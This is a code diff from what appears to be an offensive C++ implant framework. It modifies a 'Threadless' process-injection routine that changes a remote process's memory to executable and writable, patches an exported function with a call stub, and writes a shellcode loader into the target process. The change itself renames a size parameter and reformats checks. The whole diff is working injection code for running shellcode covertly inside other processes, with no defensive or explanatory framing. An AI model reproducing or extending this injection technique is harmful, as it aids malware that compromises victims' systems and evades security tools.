@@ -4,7 +4,7 @@
 
 namespace Injection {
 
-    VOID Threadless(THREADLESS Threadless, LPVOID Shellcode, SIZE_T cbShellcode, SIZE_T cbPayload) {
+    VOID Threadless(THREADLESS Threadless, LPVOID Shellcode, SIZE_T cbShellcode, SIZE_T cbFullSize) {
         // todo: needs MmPivot (Flower)
         HEXANE
 
@@ -29,14 +29,14 @@ namespace Injection {
         MmPatchData(i, Threadless.Opcode.Buffer, (CALL_X_OFFSET + i), RCAST(PBYTE, &LoaderRva), (i), 4)
 
         if (
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, RCAST(PVOID*, &exportCpy), &cbPayload, PAGE_EXECUTE_READWRITE, &Protect)) ||
-            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, RCAST(PVOID, pExport), RCAST(PVOID, Threadless.Opcode.Buffer), Threadless.Opcode.Length, &Write))
-            || Write != Threadless.Opcode.Length) {
+            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, RCAST(PVOID*, &exportCpy), &cbFullSize, PAGE_EXECUTE_READWRITE, &Protect)) ||
+            !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, RCAST(PVOID, pExport), RCAST(PVOID, Threadless.Opcode.Buffer), Threadless.Opcode.Length, &Write)) ||
+            Write != Threadless.Opcode.Length) {
             return;
         }
 
         if (
-            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, RCAST(LPVOID*, &hookCpy), &cbPayload, PAGE_READWRITE, &Protect)) ||
+            !NT_SUCCESS(Ctx->Nt.NtProtectVirtualMemory(Proc, RCAST(LPVOID*, &hookCpy), &cbFullSize, PAGE_READWRITE, &Protect)) ||
             !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook), Threadless.Loader.Buffer, Threadless.Loader.Length, &Write)) ||
             Write != Threadless.Loader.Length) {
             return;
